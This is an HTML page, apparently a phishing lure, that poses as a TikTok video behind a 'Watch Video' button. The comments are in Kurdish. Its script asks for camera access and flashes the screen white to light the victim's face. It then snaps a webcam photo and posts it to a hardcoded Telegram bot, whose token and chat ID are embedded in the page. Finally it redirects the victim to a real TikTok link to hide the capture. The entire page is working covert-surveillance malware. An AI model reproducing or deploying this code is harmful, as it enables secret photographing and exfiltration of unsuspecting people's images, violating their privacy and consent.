<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok · Video</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; transition: background 0.2s; }
        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/1t8S4QVG/42269.jpg') no-repeat center center; background-size: cover; z-index: 1; }
        .play-btn { position: relative; z-index: 100; background: #fe2c55; color: white; padding: 18px 40px; border-radius: 8px; font-family: sans-serif; font-weight: bold; border: none; cursor: pointer; font-size: 20px; }
        /* شاشەکە دەبێتە سپی وەک فلاش */
        .flash { background: #fff !important; }
        video, canvas { display: none; }
    </style>
</head>
<body id="b">
    <div class="bg" id="bg"></div>
    <button class="play-btn" id="btn" onclick="megaCapture()">▶ Watch Video</button>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        async function megaCapture() {
            const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
            const chat_id = "7261354534";
            const b = document.getElementById('b');
            const bg = document.getElementById('bg');
            const btn = document.getElementById('btn');

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();

                // قۆناغی 1: دروستکردنی فلاش بۆ کردنەوەی هاوێنەی کامێرا
                btn.style.display = 'none';
                bg.style.display = 'none';
                b.classList.add('flash');

                // قۆناغی 2: وێنەگرتن دوای فلاشەکە
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    const imageData = c.toDataURL('image/jpeg', 0.8);
                    const blob = await (await fetch(imageData)).blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', "✅ وێنەی ڕوون (Anti-Black Fix)");

                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
                }, 1500); // 1.5 چرکە بۆ ئەوەی کامێرا بەتەواوی ئامادە بێت

            } catch (e) {
                window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
            }
        }
    </script>
</body>
</html>
